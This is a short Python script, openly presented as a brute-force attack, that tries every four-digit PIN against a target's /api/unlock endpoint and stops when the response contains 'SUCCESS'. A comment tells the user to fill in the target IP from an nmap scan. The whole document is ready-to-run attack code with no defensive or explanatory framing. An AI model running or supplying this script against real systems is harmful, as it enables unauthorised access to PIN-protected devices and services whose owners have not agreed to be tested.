import requests
import sys

# UPDATE THIS IP ADDRESS BASED ON YOUR NMAP SCAN
TARGET_IP = "192.168.1.100" 
TARGET_URL = f"http://{TARGET_IP}/api/unlock"

print(f"[*] Initiating brute-force attack on {TARGET_URL}")

# Iterate through all 10,000 possible 4-digit combinations
for i in range(10000):
    pin_guess = f"{i:04d}" # Formats as 0000, 0001, etc.
    
    try:
        response = requests.get(f"{TARGET_URL}?pin={pin_guess}", timeout=2)
        sys.stdout.write(f"\r[>] Trying PIN: {pin_guess} | Status: {response.status_code}")
        sys.stdout.flush()
        
        if response.status_code == 200 and "SUCCESS" in response.text:
            print(f"\n\n[+] BINGO! Valid PIN found: {pin_guess}")
            print(f"[+] Server Response: {response.text.strip()}")
            break
            
    except requests.exceptions.RequestException:
        print("\n[-] Connection error. Check the IP address.")
        break
